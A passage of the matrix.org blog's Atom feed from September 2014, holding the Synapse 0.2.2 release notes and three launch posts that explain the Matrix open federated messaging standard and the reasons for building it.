        <link rel="alternate" href="https://matrix.org/blog/2014/09/06/synapse-v0-2-2-released/" type="text/html"/>
        <id>https://matrix.org/blog/2014/09/06/synapse-v0-2-2-released/</id>
        
        <content type="html">&lt;p&gt;Hi all,&lt;&#x2F;p&gt;
&lt;p&gt;We just pushed our first major update since matrix.org launched for Synapse, the reference Matrix homeserver:&lt;&#x2F;p&gt;
&lt;h3 id=&quot;changes-in-synapse-0-2-2-2014-09-06&quot;&gt;Changes in synapse 0.2.2 (2014-09-06)&lt;&#x2F;h3&gt;
&lt;p&gt;Webclient:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Fix desktop notifications&lt;&#x2F;li&gt;
&lt;li&gt;Add support for captchas on registration&lt;&#x2F;li&gt;
&lt;li&gt;Handle &lt;code&gt;m.room.aliases&lt;&#x2F;code&gt; events.&lt;&#x2F;li&gt;
&lt;li&gt;Implement local echo when sending message&lt;&#x2F;li&gt;
&lt;li&gt;Inform the UI when a message failed to send.&lt;&#x2F;li&gt;
&lt;li&gt;Only autoscroll on receiving a new message if the user was already at the bottom of the screen.&lt;&#x2F;li&gt;
&lt;li&gt;Add support for ban&#x2F;kick reasons.&lt;&#x2F;li&gt;
&lt;li&gt;Add &#x2F;join support for IRC acolytes&lt;&#x2F;li&gt;
&lt;li&gt;Make IRC-style commands a little more forgiving&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;Homeserver:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Validate &lt;code&gt;m.room.power_level&lt;&#x2F;code&gt; events.&lt;&#x2F;li&gt;
&lt;li&gt;When the server returns state events it now also includes the previous content if any to aid pagination&lt;&#x2F;li&gt;
&lt;li&gt;Add support for inviting people when creating a new room.&lt;&#x2F;li&gt;
&lt;li&gt;Make the homeserver inform the room via &lt;code&gt;m.room.aliases&lt;&#x2F;code&gt; when a new alias is added for a room.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;The &lt;a href=&quot;http:&#x2F;&#x2F;matrix.org&#x2F;alpha&quot;&gt;matrix.org homeserver&lt;&#x2F;a&gt; &amp;amp; webclient has already been updated to the latest version - if you&#x27;re running your own homeserver, please update. v0.2.2 retains backwards compatibility with previous homeserver releases.&lt;&#x2F;p&gt;
&lt;p&gt;Get the code from &lt;a href=&quot;http:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&quot;&gt;http:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&lt;&#x2F;a&gt;!&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Hello world</title>
        <published>2014-09-03T00:00:00+00:00</published>
        <updated>2014-09-03T00:00:00+00:00</updated>
        <author>
          <name>Unknown</name>
        </author>
        <link rel="alternate" href="https://matrix.org/blog/2014/09/03/hello-world/" type="text/html"/>
        <id>https://matrix.org/blog/2014/09/03/hello-world/</id>
        
        <content type="html">&lt;p&gt;I&#x27;m Matthew, and I&#x27;m responsible for the techie side of what we&#x27;re up to with Matrix.&lt;&#x2F;p&gt;
&lt;p&gt;Matrix is the result of a lot of work my team&#x27;s done over the last 10 years or so (first at &lt;a href=&quot;http:&#x2F;&#x2F;www.mxtelecom.com&quot;&gt;MX Telecom&lt;&#x2F;a&gt;, then &lt;a href=&quot;http:&#x2F;&#x2F;www.openmarket.com&quot;&gt;OpenMarket&lt;&#x2F;a&gt;, and then &lt;a href=&quot;http:&#x2F;&#x2F;www.amdocs.com&#x2F;UnifiedCommunications&quot;&gt;Amdocs&lt;&#x2F;a&gt;) in developing next-generation IP communication solutions.  First we started with an &lt;a href=&quot;http:&#x2F;&#x2F;www.asterisk.org&quot;&gt;Asterisk&lt;&#x2F;a&gt;-based platform running basic PSTN IVR services, and then shifted to an in-house IAX-based IVR platform built in Java, and then added circuit-switched (&lt;a href=&quot;http:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;3G-324M&quot;&gt;3G-324M&lt;&#x2F;a&gt;) video calling, then switched to SIP&#x2F;RTP, C++ and a massively-distributed softswitch architecture affectionately called &#x27;The Next Generation&#x27;.  Then the iPhone and Android came along, and we realised we didn&#x27;t have to be constrained by built-in phone capabilities and ported our whole C++ SIP&#x2F;RTP VoIP stack over to iOS&#x2F;Android and got writing Video&#x2F;VoIP calling apps.  This evolved to developing full-blown unified communication apps (e.g. &lt;a href=&quot;http:&#x2F;&#x2F;www.blah.com&quot;&gt;Blah&lt;&#x2F;a&gt;), using XMPP at first for messaging before switching to our own HTTP-based messaging APIs.&lt;&#x2F;p&gt;
&lt;p&gt;Somewhere along the way it became painfully obvious that VoIP and IM hasn&#x27;t really evolved as well as the rest of the internet.  Back when SIP&#x2F;RTP first emerged, it simply wasn&#x27;t mature enough to work on the open internet as well as HTTP or SMTP or even FTP - it needed STUN, ICE, TURN, Opus and many other refinements to be really usable in the wild.  And similarly XMPP hasn&#x27;t taken over the world quite as much as we once hoped.  Meanwhile, many folks went and built their own proprietary walled-garden solutions (be it Skype, FaceTime, Viber, WhatsApp, or even our own efforts) and we&#x27;ve ended up in the current horrible situation where our online communication is fragmented across hundreds of isolated apps and websites.  It&#x27;s like a world where email was never unified, and half the world is still stuck on Compuserve.  And it&#x27;s counter to the whole ethos of the internet as an open platform for collaboration and communication.&lt;&#x2F;p&gt;
&lt;p&gt;We decided that we want to fix this and so we have built and published a new open standard, together with open source (ASLv2) reference server (Python&#x2F;Twisted) and client (JS&#x2F;Angular, Python, Perl) codebases, and so provide new building blocks that can be used to build truly interoperable federated IM and VoIP functionality.  We consider this effectively an investment in the industry: by creating a strictly non-profit initiative like Matrix, we both make the world a better place for end users - as well as creating new business opportunities (both opensource and commercial) for the telecoms industry as a whole.&lt;&#x2F;p&gt;
&lt;p&gt;The standard and code are all brand new and very much still in creation at this point, but we&#x27;re releasing it early to get as much feedback and input from the community as early on as we possibly can. Right now our focus is on fully decentralised federated group messaging, but VoIP and identity management is coming together well too.  You can think of it as &amp;quot;making VoIP&#x2F;IM as interoperable and flexible as email&amp;quot;, or perhaps &amp;quot;the missing signalling layer for WebRTC&amp;quot;, &amp;quot;XMPP for an HTTP world&amp;quot;, or “what would happen if IRC, XMPP, SIP, SMTP, IMAP and NNTP had kids?” Here are some reasons we think that you should use Matrix:&lt;&#x2F;p&gt;
&lt;ul&gt;
	&lt;li&gt;&lt;span style=&quot;font-size: 1rem; line-height: 1.714285714;&quot;&gt;Simple pragmatic RESTful HTTP&#x2F;JSON APIs.  No more XMPP or SIP stacks and wrestling XML streams or torture-testing SIP parsers.&lt;&#x2F;span&gt;
&lt;&#x2F;li&gt;
	&lt;li&gt;&lt;span style=&quot;font-size: 1rem; line-height: 1.714285714;&quot;&gt;No single points of control for channels of communication (unless you really want it for moderation or similar). Room state for a room is synchronised with eventual consistency over all participating Matrix servers - no single server controls the room.&lt;&#x2F;span&gt;
&lt;&#x2F;li&gt;
	&lt;li&gt;&lt;span style=&quot;font-size: 1rem; line-height: 1.714285714;&quot;&gt;No more netsplits - history re-heals itself if the matrix fractures&lt;&#x2F;span&gt;
&lt;&#x2F;li&gt;
	&lt;li&gt;&lt;span style=&quot;font-size: 1rem; line-height: 1.714285714;&quot;&gt;All communication is group by default: 1:1 chat is just a subset of group chat.&lt;&#x2F;span&gt;
&lt;&#x2F;li&gt;
	&lt;li&gt;&lt;span style=&quot;font-size: 1rem; line-height: 1.714285714;&quot;&gt;Multi-device aware: all state is stored and synchronised in realtime across all devices, and away-state and notifications are aware of multiple devices.&lt;&#x2F;span&gt;
&lt;&#x2F;li&gt;
	&lt;li&gt;&lt;span style=&quot;font-size: 1rem; line-height: 1.714285714;&quot;&gt;Uses arbitrary 3rd party identifiers - doesn&#x27;t rely on JIDs or SIP URIs for identity.&lt;&#x2F;span&gt;
&lt;&#x2F;li&gt;
	&lt;li&gt;&lt;span style=&quot;font-size: 1rem; line-height: 1.714285714;&quot;&gt;Share the same simple HTTP signalling channel for messaging and VoIP&lt;&#x2F;span&gt;
&lt;&#x2F;li&gt;
	&lt;li&gt;&lt;span style=&quot;font-size: 1rem; line-height: 1.714285714;&quot;&gt;Support more efficient transports if you want (e.g. low-bandwidth&#x2F;low-roundtrip sync on mobile)&lt;&#x2F;span&gt;
&lt;&#x2F;li&gt;
	&lt;li&gt;&lt;span style=&quot;font-size: 1rem; line-height: 1.714285714;&quot;&gt;Built for mobile - e.g. support push notification and low-bandwidth&#x2F;low-latency client-server transports if needed (in progress)&lt;&#x2F;span&gt;
&lt;&#x2F;li&gt;
	&lt;li&gt;&lt;span style=&quot;font-size: 1rem; line-height: 1.714285714;&quot;&gt;TLS (HTTPS) by default, either with self-signed certs with published public keys or proper SSL CA signed certs (in progress)&lt;&#x2F;span&gt;
&lt;&#x2F;li&gt;
	&lt;li&gt;&lt;span style=&quot;font-size: 1rem; line-height: 1.714285714;&quot;&gt;End-to-end PKI encryption (in progress)&lt;&#x2F;span&gt;
&lt;&#x2F;li&gt;
	&lt;li&gt;&lt;span style=&quot;font-size: 1rem; line-height: 1.714285714;&quot;&gt;Trusted federation of public identity servers available for publishing your PKI public keys and tracking your validated 3rd party IDs&lt;&#x2F;span&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
If this sounds good to you, then please take a look at the &lt;a href=&quot;http:&#x2F;&#x2F;matrix.org&#x2F;docs&#x2F;spec&quot;&gt;spec&lt;&#x2F;a&gt;, or our &lt;a href=&quot;http:&#x2F;&#x2F;matrix.org&#x2F;docs&#x2F;howtos&quot;&gt;tutorials&lt;&#x2F;a&gt;, or jump straight into playing with the &lt;a href=&quot;http:&#x2F;&#x2F;matrix.org&#x2F;docs&#x2F;api&quot;&gt;APIs&lt;&#x2F;a&gt;, or try running your own Matrix homeserver, or sign up to our &lt;a href=&quot;http:&#x2F;&#x2F;matrix.org&#x2F;mailman&quot;&gt;mailing lists&lt;&#x2F;a&gt; - and whatever else, come swing by &lt;a href=&quot;http:&#x2F;&#x2F;matrix.org&#x2F;alpha&quot;&gt;#matrix:matrix.org&lt;&#x2F;a&gt; and say hi!
&lt;p&gt;&lt;a href=&quot;http:&#x2F;&#x2F;xkcd.com&#x2F;927&#x2F;&quot;&gt;&lt;img class=&quot;aligncenter&quot; style=&quot;box-shadow: 0 0 0 ! important&quot; src=&quot;http:&#x2F;&#x2F;imgs.xkcd.com&#x2F;comics&#x2F;standards.png&quot; alt=&quot;&quot; &#x2F;&gt;&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Welcome to the Matrix blog!</title>
        <published>2014-09-03T00:00:00+00:00</published>
        <updated>2014-09-03T00:00:00+00:00</updated>
        <author>
          <name>Unknown</name>
        </author>
        <link rel="alternate" href="https://matrix.org/blog/2014/09/03/welcome-to-the-matrix-blog/" type="text/html"/>
        <id>https://matrix.org/blog/2014/09/03/welcome-to-the-matrix-blog/</id>
        
        <content type="html">&lt;p&gt;Today is a big day for us as we are launching Matrix.org, an open initiative which has the goal of making real-time communication over IP as seamless and interoperable as email.&lt;&#x2F;p&gt;
&lt;p&gt;How do we want to achieve this? Very simply by creating a new federated, open-source ecosystem for VoIP and instant messaging on the internet! Ambitious right? :)&lt;&#x2F;p&gt;
&lt;p&gt;Actually not that much! In practice it&#x27;s fairly simple: we are publishing the specification of a pragmatic and lightweight open standard, some opensource reference implementations of the servers and clients, and pragmatic RESTful HTTP JSON APIs, all of which are available right now on &lt;a title=&quot;Github&quot; href=&quot;http:&#x2F;&#x2F;github.com&#x2F;matrix-org&quot; target=&quot;_blank&quot;&gt;Github&lt;&#x2F;a&gt;!&lt;&#x2F;p&gt;
&lt;p&gt;What does this mean for the world?&lt;&#x2F;p&gt;
&lt;p&gt;For techies, it gives developers a new way of building and running their own communications functionality, or integrating existing services into the Matrix ecosystem.&lt;&#x2F;p&gt;
&lt;p&gt;For consumers, it means that eventually they may be able to choose to use their favourite app from their trusted app provider, whilst reaching anyone they like given the entire Matrix ecosystem is interoperable.&lt;&#x2F;p&gt;
&lt;p&gt;So this is the very high level description of Matrix, but it misses the reasons why we&#x27;ve started this. We thought that rather than summarizing the main reasons for launching this project in a faceless post it would be interesting to present it from different perspectives, so we&#x27;ve asked some of the core team to give their take on it:&lt;&#x2F;p&gt;
&lt;p style=&quot;padding-left: 30px;&quot;&gt;- Read &lt;strong&gt;&lt;a href=&quot;http:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;?p=62&quot;&gt;Matthew&#x27;s&lt;&#x2F;a&gt;&lt;&#x2F;strong&gt; post and get an insight of Matrix&#x27; technical history and rationale.&lt;&#x2F;p&gt;
&lt;p style=&quot;padding-left: 30px;&quot;&gt;- Check out &lt;strong&gt;&lt;a title=&quot;Why Matrix?&quot; href=&quot;http:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;?p=12&quot;&gt;Amandine&#x27;s &lt;&#x2F;a&gt;&lt;&#x2F;strong&gt;view on why the users need Matrix.&lt;&#x2F;p&gt;
&lt;p style=&quot;text-align: right;&quot;&gt;The Matrix Team&lt;&#x2F;p&gt;
PS: Matrix is hoping to talk about the future of communication in general at &lt;b&gt;SXSW Interactive&lt;&#x2F;b&gt;  - if you like the idea of Matrix, please &lt;strong&gt;vote for us&lt;&#x2F;strong&gt; by clicking &lt;a href=&quot;http:&#x2F;&#x2F;panelpicker.sxsw.com&#x2F;vote&#x2F;37949&quot;&gt;here&lt;&#x2F;a&gt; before September 5th!
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Why Matrix?</title>
        <published>2014-09-03T00:00:00+00:00</published>
        <updated>2014-09-03T00:00:00+00:00</updated>
        <author>
          <name>Unknown</name>
        </author>
        <link rel="alternate" href="https://matrix.org/blog/2014/09/03/why-matrix/" type="text/html"/>
        <id>https://matrix.org/blog/2014/09/03/why-matrix/</id>
        
        <content type="html">&lt;p&gt;Hi, I&#x27;m Amandine and I look after the businessy bits of Matrix.org. I have a technical background and have always had the need to see the bigger picture. My motivation in starting Matrix has mainly been to make my dream of ubiquitous real-time communications come true and fix what felt broken in the industry. Here is the story.&lt;&#x2F;p&gt;
&lt;p&gt;When studying telecoms I was fascinated by converging networks, the “Next Generation Network” as we called it. Wow, imagine! Having fixed lines, mobiles and computers able to communicate with each other? Call a number and have the ability to answer seamlessly on any device? And the capability to do video calls and share files? &lt;i&gt;That &lt;&#x2F;i&gt;was definitely Next Generation at the time! Especially given the best we could do with a mobile was bad GSM, MMS and WAP if you were lucky.... A decade later video calling is possible on any device; I can share anything I want with my contacts (pictures, videos, files, random stickers) thanks to hundreds of different apps; sometimes my history is even synced across several devices! And if I choose my mobile provider carefully I can even have a “One Number” service! :)&lt;&#x2F;p&gt;
&lt;p&gt;But still, we&#x27;re far away from the ubiquitous dream of 10 years ago. None of my apps are talking to each other. One number is more often “one login per app”. My conversation history is scattered across all the apps (who never experienced the “Did you tell me on Facebook, Whatsapp, Skype or SMS???” question followed by 10 minutes of intense fiddling with your phone which of course is running out of battery?). My address book and profile data is stored everywhere by companies like Facebook, Google and random startups, but who knows how much they really value your privacy...&lt;&#x2F;p&gt;
&lt;p&gt;Is the tech not good enough yet? Only partially: most of the features, typically IM, video, VoIP,  are already available and widely used. However it is a reality that no tech has really imposed itself as an interoperability standard. What about economic blockers then? A better bet: what are the incentives for big companies and small startups to share their communities? Most of these corporations choose a business model that locks their users into walled gardens, directly linking their valuation to this user base. But ultimately this is bad for competition and bad for the users.&lt;&#x2F;p&gt;
&lt;p&gt;What about phone networks then? Why don&#x27;t they do anything? Well, they have tried. It&#x27;s called RCS (Rich Communication Services), or joyn. It&#x27;s a good initiative designed by committee and implemented as a functionality deeply embedded in the network rather than a light over-the-top deployment and consequently very expensive and time-consuming to put in place. Similarly as per telco&#x27;s historical positioning, RCS is more focused on quality of service than quality of user experience. But RCS is facing a few challenges: communications over IP must be free for the user to compete with the Skype &amp;amp; WhatsApp of this world, which limits a lot the return on investment of the deployment of an expensive network update, limiting the adoption of RCS by mobile networks. Besides quality of service is not necessarily what will trigger a success when competing with over the top apps which are 100% focused on providing the best user experience... And despite the GSMA&#x27;s best efforts implementing interoperability between networks is proving very painful, limiting the growth of the ecosystem.&lt;&#x2F;p&gt;
&lt;p&gt;But ultimately we all know that today success is driven by users. This multitude of minds which decides the exact split of fun and usefulness that will define the value of a product and make it crazily successful overnight. So why are users not pushing for this ubiquity? I see two reasons: first they often don&#x27;t realize how useful it could be and second: there is nothing to push! Indeed it can easily be considered as handy to have one app per group of people I want to communicate with: Facebook messenger with my school friends, Whatsapp with international friends, Skype with my family, Snapchat with my boyfriend, Voxer with my best friend... But why can&#x27;t I have only one app, the one &lt;i&gt;I&lt;&#x2F;i&gt; prefer, to get in touch with everyone, whatever they are using? And if I want a fancy Tango-like video experience then I couldstill launch Tango for this scenario and have the whole chat history there. I truly believe that once fragmentation will be over everyone will wonder how we could ever live with it.&lt;&#x2F;p&gt;
&lt;p&gt;And what about privacy? Isn&#x27;t it bad enough that the second I send an email to my friend asking if he&#x27;s booked his flights to Madrid I get a flurry of airline adverts for flights to Spain? Even without going into the debate of whether governments should file every citizen, it&#x27;s a question of principles - I&#x27;d rather have my communication history and my contacts stored by someone I trust and avoid useless adverts.  Some of you will say “Oh but you&#x27;re French. ‘Vive la Révolution!&#x27; is your default motto...” - but think about it for a minute:&lt;&#x2F;p&gt;
&lt;p&gt;Imagine: only install the apps &lt;i&gt;you&lt;&#x2F;i&gt; want on your phone for communication. Use the ones you prefer because the UX is great or you love their smileys. Your whole address book is there, correctly merged. All the conversation history with your friends and family is there. And you don&#x27;t care what app they&#x27;re using. Or how they logged in: your app discovers them based on any ID (email, phone number, Facebook): you just need to have them in your address book. You know where your data is - perhaps stored by a new startup using renewable energy for their data center, just because you want to save the planet. Or by your geeky brother running his own server under his bed (using end-to-end encryption if you think he might be nosy!). You can still have many apps but each allows you to do different fun stuff: fancy video, crazy pictures, drawings, imaginative stickers. You control your communication.  You decide what to you want to use, who you want to trust. Welcome to Matrix.&lt;&#x2F;p&gt;
</content>
        
    </entry>
</feed>
